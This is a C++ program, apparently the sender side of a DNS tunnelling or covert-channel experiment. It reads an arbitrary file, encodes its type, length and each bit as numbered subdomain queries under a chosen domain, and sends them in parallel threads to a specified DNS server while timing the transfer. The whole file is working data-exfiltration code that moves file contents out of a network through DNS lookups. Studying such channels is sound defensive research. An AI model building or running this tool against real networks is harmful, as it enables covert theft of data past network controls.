#include <iostream>
#include <fstream>
#include <bitset>
#include <string>
#include <unistd.h>
#include <cstring>
#include <unordered_map>
#include <cstdint>
#include <chrono>
#include <thread>
#include <vector>
#include <atomic>

#include "extension_map.h"
#include "dns_tcp_client.h"
using namespace std;

#ifdef DEBUG
#define DEBUG_COUT(x) do { x } while(0)
#else
#define DEBUG_COUT(x) do {} while(0)
#endif

atomic<bool> has_error(false);

void transmit(vector<string> domains, string dns_server){
    DnsTcpClient client;
    if (!client.connect_to(dns_server, "53")) {
        cerr << "connect failed\n";
        has_error.store(true);
        return;
    }
    vector<uint8_t> resp;
    for (const auto& qd : domains) {
        DEBUG_COUT(cout << "sending: " << qd << "\n";);
        if (!client.query_raw(qd, resp)) {
            cerr << "query_raw failed: " << qd << "\n";
            has_error.store(true);
            break;
        }
    }
    client.close();
}

bool send_message(string filename, string nxdomain, string dns_server, int num_threads){
    // ---- Read input file ----
    ifstream input_file(filename, ios::binary);
    if (!input_file.is_open()) {
        cerr << "Unable to open " << filename << endl;
        return false;
    }

    // Get file size
    input_file.seekg(0, input_file.end);
    size_t size = input_file.tellg();
    input_file.seekg(0, input_file.beg);

    // Initialize type(8-bit) and length(24-bit)
    uint8_t type[1] = {0};
    uint8_t length[3] = {0};

    // Get type, using extension_map.h function "getTypeValue"
    type[0] = getTypeValue(filename);

    // Get length (file size)
    length[0] = (size >> 16) & 0xFF;
    length[1] = (size >> 8)  & 0xFF;
    length[2] = size & 0xFF;

#ifdef DEBUG   // Show type and length after setting
    cout << "After Type: " << bitset<8>(type[0]) << endl;
    cout << "File size is: " << size << " bytes\n";
    cout << "File size is (hex): " << hex <<  size << dec << " bytes\n";
    cout << "After Length: " << bitset<8>(length[0]) << " " 
                             << bitset<8>(length[1]) << " " 
                             << bitset<8>(length[2]) << endl;
#endif

    // Initialize value and read from input file
    char* value = new char[size];
    input_file.read(value, size); 
    input_file.close();

    // Definition thread
    vector<thread> workers;
    workers.reserve(num_threads);

    // Step1: Send type (8-bit) 
    bitset<8> b_type(type[0]);
    vector<string> type_domains;
    for (size_t i = 0; i < b_type.size(); i++) {
        DEBUG_COUT(cout << "b_type[" << i << "]: " << b_type[i] << endl;);
        if (b_type[i] == 1) {
            type_domains.push_back(to_string(i) + "." + nxdomain);         
        }
    }
    if (!type_domains.empty())
        workers.emplace_back(transmit, type_domains, dns_server);

    for (auto& t: workers) t.join();
    workers.clear();
    if (has_error.load()) {
        delete[] value;
        return false;
    }

    // Step2: Send length (24-bit) 
    for (size_t i = 0; i < 3; i++) {
        bitset<8> b_length(length[i]);
        vector<string> domains;

        DEBUG_COUT(cout << "===================\n" 
             << "length[" << i << "]: " << length[i] << "  "
             << "b_length holds " << b_length << endl;);

        for (size_t j = 0; j < b_length.size(); j++) {
            DEBUG_COUT(cout << "b_length[" << 8+i*8+j << "]: " << b_length[j] << endl;);
            if (b_length[j] == 1) {
                int index = 8 + i*8 + j;
                domains.push_back(to_string(index) + "." + nxdomain);
            }
        }

        if (!domains.empty())
            workers.emplace_back(transmit, domains, dns_server);
    }

    for(auto& t: workers) t.join();
    workers.clear();
    if (has_error.load()) {
        delete[] value;
        return false;
    }

    // Step3: Send value
    for (size_t i = 0; i < size; i++) {
        bitset<8> bits(value[i]);
        vector<string> domains;

        DEBUG_COUT(cout << "===================\n"
             << "value[" << i << "]: " << value[i] << "  "
             << "bits holds " << bits << endl;);

        for (size_t j = 0; j < bits.size(); j++) {
            DEBUG_COUT(cout << "bits[" << 32 + i*8+j << "]: " << bits[j] << endl;);
            if (bits[j] == 1) {
                int index = 32 + i*8 + j;
                domains.push_back(to_string(index) + "." + nxdomain);
            }
        }

        if(!domains.empty()) {
            workers.emplace_back(transmit, domains, dns_server);
            
            if ((int)workers.size() == num_threads || i == size - 1) {
                for (auto& t: workers) t.join();
                workers.clear();
                if (has_error.load()) {
                    delete[] value;
                    return false;
                }
            }
        }
    }
       
    // free memory
    delete[] value;
    return true;
}


int main(int argc, char** argv){
    // Check command line arguments
    if (argc != 5) {
        cerr << "Usage: " << argv[0] << " <filename> <nxdomain> <dns_server> <num_threads>" << endl;
        return 1;
    }

    int num_threads = atoi(argv[4]);

    // ------ start measure ------
    auto start = chrono::high_resolution_clock::now();
    if (!send_message(argv[1], argv[2], argv[3], num_threads)) {
        cerr << "send message() failed.\n";
        return 1;
    }

    // ------- end measure ------
    auto end = chrono::high_resolution_clock::now();

    // ------- total time -------
    auto total_time = chrono::duration_cast<chrono::milliseconds>(end - start).count();
    cout << "sender runtime: " << total_time << " ms";

    return 0;
}
